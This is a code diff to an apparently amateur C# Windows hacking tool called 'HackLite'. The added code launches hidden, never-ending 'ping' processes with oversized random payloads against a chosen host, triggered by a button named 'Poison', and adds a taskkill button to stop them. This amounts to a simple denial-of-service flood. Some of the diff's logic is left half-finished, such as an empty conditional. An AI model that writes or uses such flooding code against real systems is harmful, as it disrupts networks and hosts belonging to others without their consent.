@@ -16,6 +16,7 @@ using SharpPcap.LibPcap;
 using System.Net.NetworkInformation;
 using System.Threading;
 using System.Net;
+using System.Diagnostics;
 
 namespace HackLite
 {
@@ -37,6 +38,7 @@ namespace HackLite
         //the mac of the local box
         public static PhysicalAddress localMAC;
         private PcapAddress Address;
+        String Saved_Address;
 
         public FrmHome()
         {
@@ -291,18 +293,37 @@ namespace HackLite
             device.SendPacket(ethernetPacket);
         }
 
-        Task<PingReply> PingAsync(string address)
+        Task<PingReply> Ping(string address)
         {
+            Random random = new Random();
+            int counter = random.Next(5000, 65000);
             var tcs = new TaskCompletionSource<PingReply>();
             Ping ping = new Ping();
-            string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+            string data = "a";
+            string strCmdText;
+            
+            
+
+            for (int i = 0; i<counter; i++)
+            {
+                data += "a";
+            }
             byte[] buffer = Encoding.ASCII.GetBytes(data);
+            System.Diagnostics.Process cmdping = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "ping";
+            //cmdping.StartInfo.UseShellExecute = false;
+            startInfo.Arguments = (" " + Saved_Address + " -t -l " + counter);
+            cmdping.StartInfo = startInfo;
+            cmdping.Start();
             int timeout = 10000;
             PingReply reply = ping.Send(address, timeout, buffer);
+            dataGridView2.Rows.Add(reply.Address, reply.Buffer.Length);
             ping.PingCompleted += (obj, sender) =>
             {
-                if (sender.Reply.Status == IPStatus.Success)
-                    dataGridView2.Rows.Add(sender.Reply.Address, reply.Buffer.Length);
+                if (reply.Status == IPStatus.Success)
+                    
                     
                     
                 tcs.SetResult(sender.Reply);
@@ -335,6 +356,7 @@ namespace HackLite
                 MessageBox.Show(ex.Message);
             }
             updateTable();
+            Saved_Address = dataGridView1.Rows[0].Cells[0].Value.ToString();
         }
 
         private void tabView_Selecting(object sender, TabControlCancelEventArgs e)
@@ -377,9 +399,30 @@ namespace HackLite
 
         private void BtnPoison_Click(object sender, EventArgs e)
         {
-            string Address = "192,168.0.1"; 
-            PingAsync(Address);
+         for (int i = 0; i < 1; i++)
+            {
+                Ping(Saved_Address);
+            }
         }
 
+        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
+        {
+            int rowIndex = e.RowIndex;
+            DataGridViewRow row = dataGridView1.Rows[rowIndex];
+           
+            Saved_Address = dataGridView1.Rows[rowIndex].Cells[0].Value.ToString();
+        }
+
+        private void btnKillPing_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process killPing = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo killInfo = new System.Diagnostics.ProcessStartInfo();
+            killInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            killInfo.FileName = "Taskkill";
+            //cmdping.StartInfo.UseShellExecute = false;
+            killInfo.Arguments = ("/IM PING.EXE /F");
+            killPing.StartInfo = killInfo;
+            killPing.Start();
+        }
     }
 }
